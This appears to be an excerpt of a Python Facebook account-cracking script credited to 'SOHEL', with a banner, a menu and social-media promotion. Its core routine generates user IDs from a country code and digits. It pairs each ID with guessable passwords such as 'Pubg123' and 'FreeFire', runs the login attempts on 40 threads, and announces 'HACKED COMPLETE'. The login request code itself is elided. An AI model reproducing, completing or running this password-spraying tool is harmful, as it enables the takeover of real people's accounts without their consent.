# Gift By SOHEL
# Telegram Id :@YourJamai_420

# Facebook Group : https://www.facebook.com/S0HEL.1492?mibextid=ZbWKwL/
...
logo =("""
\033[1;36m 
\033[1;91m   ________  ________  _______   ________  _______ 
\033[1;96m  /        \/        \/    /  \\/        \/       \
\033[1;36m /        _/         /        //         /        /
\033[1;92m/-        /         /         /        _/        / 
\033[1;32m\_______//\________/\___/____/\________/\________/ 
"  
\033[1;91m╔═════════════════════════╗
\033[1;92m •⎯͢⎯⃝🩵-⊰༎⊱🌸❐SOHEL-VAU❐•⎯͢⎯⃝🩵-⊰༎⊱🌸
\033[1;91m╚═════════════════════════╝
""") 
...
def SOHEL():
    ...
    print("\033[1;96m ╠═════════════════════════════════╣")
    print(" \033[1;36m║  \033[1;35m[\033[1;32m2\033[1;35m][\033[1;32mB\033[1;35m] \033[1;32m ᎫϴᏆΝ ᎷƳ ҒᏴ ᏀᎡϴႮᏢ       \033[1;36m║https://www.facebook.com/S0HEL.1492")
    ...
    print("\033[1;96m ╚═════════════════════════════════╝")
    print("")
    SOHEL = input(f'\033[1;32m ՏᎬᏞᎬᏟͲᎬᎠ ƳϴႮᎡ ϴᏢͲᏆϴΝ :\033[1;36m ')
    if SOHEL in ["1","A"]:
        SOHELs()
    if SOHEL in ["2","B"]:
...
def SOHELs():
    ...
    with ThreadPool(max_workers=40) as Fb_crack:
        ...
        print(f'\033[1;91m║\033[1;92m ᏀᏆҒͲ ᏴƳ ❐𝐊𝐈𝐍𝐆 - SOHEL❐ ')
        print("\033[1;91m╚═════════════════════════════════════╝")
        for love in user:
            pwx = [love,love[2:],code+love[:3],'FreeFire','Pubg123','TikTok','Alh4aj']
            uid = code+love
            Fb_crack.submit(SOHELm,uid,pwx,tl)
    print("\033[1;91m╔═══════════════════════════╗")
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HACKED COMPLETE ')
    print(' \033[1;91m[\033[1;92m😚\033[1;91m]\033[1;92m HI IM SOHEL ')
    print("\033[1;91m╚═══════════════════════════╝")


def SOHELm(uid,pwx,tl):
    global loop
    global cps
    global oks
    global agents
